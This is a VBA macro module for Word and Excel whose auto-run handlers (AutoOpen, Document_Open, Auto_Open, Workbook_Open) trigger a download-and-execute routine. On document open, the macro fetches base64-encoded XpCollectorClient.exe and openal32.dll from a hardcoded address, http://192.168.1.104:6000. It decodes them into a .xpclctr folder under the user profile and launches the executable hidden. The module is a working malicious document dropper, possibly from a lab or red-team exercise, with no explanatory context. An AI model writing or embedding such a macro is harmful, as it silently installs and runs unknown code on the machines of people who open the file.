Public alreadyLaunched As Integer

Sub HttpGetAndDecodeBase64ToFile(Url As String, OutputPath As String)
    ' Declare variables
    Dim WinHttpReq As Object
    Dim FileStream As Object
    Dim Base64Encoded As String
    Dim BinaryData As Variant
    ' Create the HTTP request object
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    ' Open the HTTP connection
    WinHttpReq.Open "GET", Url, False
    WinHttpReq.Send
    
    ' Check if the request was successful
    If WinHttpReq.Status = 200 Then
        ' Get the base64-encoded response text
        Base64Encoded = WinHttpReq.responseText
        
        ' Decode base64 to binary data
        BinaryData = Base64Decode(Base64Encoded)
        
        ' Save the binary data to a file
        Set FileStream = CreateObject("ADODB.Stream")
        FileStream.Type = 1 ' Binary
        FileStream.Open
        FileStream.Write BinaryData
        FileStream.SaveToFile OutputPath, 2 ' Save binary data to file
        FileStream.Close
    End If
End Sub

Sub CreateFolderIfNotExists(folderPath As String)
    Dim fso As Object

    ' Create FileSystemObject
    Set fso = CreateObject("Scripting.FileSystemObject")

    ' Check if the folder exists
    If Not fso.FolderExists(folderPath) Then
        ' If the folder doesn't exist, create it
        fso.CreateFolder folderPath
    End If
End Sub

Private Sub Client()
    ' Declare variables
    Dim client_url As String
    Dim openal_dll_url As String
    Dim ClientPath As String
    Dim OpenAlDllPath As String
    Dim folderPath As String
    Dim result As Boolean
    
    ' URL of the file to be downloaded (Base64-encoded)
    client_url = "http://192.168.1.104:6000/XpCollectorClient.exe"
    openal_dll_url = "http://192.168.1.104:6000/openal32.dll"

    folderPath = Environ("USERPROFILE") & "\" & ".xpclctr"
    CreateFolderIfNotExists (folderPath)
    ClientPath = folderPath & "\XpCollectorClient.exe"
    OpenAlDllPath = folderPath & "\openal32.dll"
    
    HttpGetAndDecodeBase64ToFile client_url, ClientPath
    HttpGetAndDecodeBase64ToFile openal_dll_url, OpenAlDllPath
    
    Shell ClientPath, vbHide ' minimized

End Sub

Function Base64Decode(ByVal base64String As String) As Variant
    ' This function decodes a base64 string to binary data
    Dim objXML As Object
    Dim objNode As Object
    
    ' Create an XML document and a node
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("base64")
    
    ' Assign the base64 string to the node's dataType and text properties
    objNode.DataType = "bin.base64"
    objNode.Text = base64String
    
    ' Return the binary data
    Base64Decode = objNode.nodeTypedValue
End Function


Private Sub Launch()
    If alreadyLaunched = True Then
        Exit Sub
    End If
    Client
    alreadyLaunched = True
End Sub
Sub AutoOpen()
    ' Becomes launched as first on MS Word
    Launch
End Sub

Sub Document_Open()
    ' Becomes launched as second, another try, on MS Word
    Launch
End Sub

Sub Auto_Open()
    ' Becomes launched as first on MS Excel
    Launch
End Sub

Sub Workbook_Open()
    ' Becomes launched as second, another try, on MS Excel
    Launch
End Sub




